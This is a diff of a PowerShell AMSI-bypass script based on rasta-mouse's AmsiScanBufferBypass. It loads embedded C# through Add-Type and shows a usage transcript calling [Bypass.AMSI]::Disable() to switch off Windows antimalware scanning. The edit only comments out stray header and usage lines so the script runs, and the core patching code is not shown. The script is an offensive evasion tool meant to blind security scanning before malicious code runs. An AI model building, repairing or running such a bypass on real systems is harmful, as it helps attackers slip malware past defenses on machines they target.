@@ -28,7 +28,7 @@ function Bypass-AMSI
 }
 
 ######################################################################################################################################
-[**] update 08/01/2019 from rasta-mouse's AmsiScanBufferBypass project (https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/):
+# [**] update 08/01/2019 from rasta-mouse's AmsiScanBufferBypass project (https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/):
 ######################################################################################################################################
 $Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
@@ -79,12 +79,12 @@ namespace Bypass
 
 Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
 
-[+] Usage:
-PS C:\Users\jmbourbon\Desktop\R&D> . .\amsi-bypass.ps1
-PS C:\Users\jmbourbon\Desktop\R&D> [Bypass.AMSI]::Disable()
-0
+# [+] Usage:
+# PS C:\Users\jmbourbon\Desktop\R&D> . .\amsi-bypass.ps1
+# PS C:\Users\jmbourbon\Desktop\R&D> [Bypass.AMSI]::Disable()
+# 0
 
-PS C:\Users\jmbourbon\Desktop\R&D> "AmsiScanBuffer"
-AmsiScanBuffer 
+# PS C:\Users\jmbourbon\Desktop\R&D> "AmsiScanBuffer"
+# AmsiScanBuffer 
 
 
